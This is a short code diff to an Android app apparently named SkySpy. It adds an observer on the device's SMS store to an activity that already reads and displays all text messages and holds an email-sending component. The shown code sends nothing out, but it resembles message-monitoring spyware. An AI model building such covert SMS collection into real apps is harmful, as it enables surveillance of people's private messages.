@@ -1,8 +1,10 @@
 package com.example.skyspy.app.ui;
 
 import android.app.Activity;
+import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.os.Handler;
 import android.util.Log;
 import android.view.Menu;
 import android.view.MenuItem;
@@ -12,12 +14,15 @@ import android.widget.Toast;
 import com.example.skyspy.app.R;
 import com.example.skyspy.app.email.EmailSending;
 import com.example.skyspy.app.sms.SmsReader;
+import com.example.skyspy.app.sms.SmsSentObserver;
 import com.example.skyspy.app.utils.Utils;
 
 public class SmsActivity extends Activity{
 
     private EmailSending mEmailSending;
     private String mLetter;
+    private SmsSentObserver mSmsSentObserver;
+    private static final Uri STATUS_URI = Uri.parse("content://sms");
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -27,6 +32,8 @@ public class SmsActivity extends Activity{
         mLetter = smsReader.getSmsList();
         textView.setText(mLetter);
         setContentView(textView);
+        mSmsSentObserver = new SmsSentObserver(new Handler(), this);
+        getContentResolver().registerContentObserver(STATUS_URI, true, mSmsSentObserver);
     }
 
     @Override
